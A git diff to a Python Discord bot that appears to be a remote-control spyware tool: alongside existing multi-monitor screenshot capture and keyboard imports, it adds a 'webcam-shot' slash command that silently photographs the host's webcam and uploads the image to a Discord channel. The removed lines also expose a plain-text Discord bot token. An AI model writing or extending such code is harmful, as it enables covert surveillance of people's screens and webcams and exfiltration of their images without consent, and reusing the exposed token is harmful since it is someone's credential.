@@ -3,14 +3,23 @@ import discord
 import keyboard
 import ctypes
 from mss import mss
+import cv2
 
-# TODO: Add a webcam capture command that sends pics from webcam!
-
-token = 'MTEzODU0OTQwMzc4Nzk5MzEwOA.G3_x7a.U4aDNVZm2RJeNDp6M2iFzVtul-1uT0hudOlItI'  # DONT COMMIT THIS PLEASE!
+token = '************'  # DONT COMMIT THIS PLEASE!
 bot = discord.Bot()
 
 
 class funcs:
+  
+  def takeWebcamShot():
+    resolution = (1920, 1080)
+    pic_name = 'webcam-shot.png'
+    cap = cv2.VideoCapture(0)
+    cap.set(3, resolution[0])  # set Width
+    cap.set(4, resolution[1])  # set Height
+    r, image = cap.read()
+    cv2.imwrite(pic_name, image)
+    return pic_name
 
   def grabScreenshot():
     # Takes a screen shot of all monitors
@@ -94,6 +103,12 @@ async def screenshot(ctx):
 
   await ctx.respond('Monitor 1', file=picture1)
   await ctx.respond('Monitor 2', file=picture2)
+  
+
+@bot.slash_command(name='webcam-shot', description='Grab a shot from the webcam')
+async def grabWebcam(ctx):
+  pic_name = funcs.takeWebcamShot()
+  await ctx.send('Webcam', file=discord.File(pic_name))  # 'ctx.respond' throws an error so we do this
 
 
 def start():
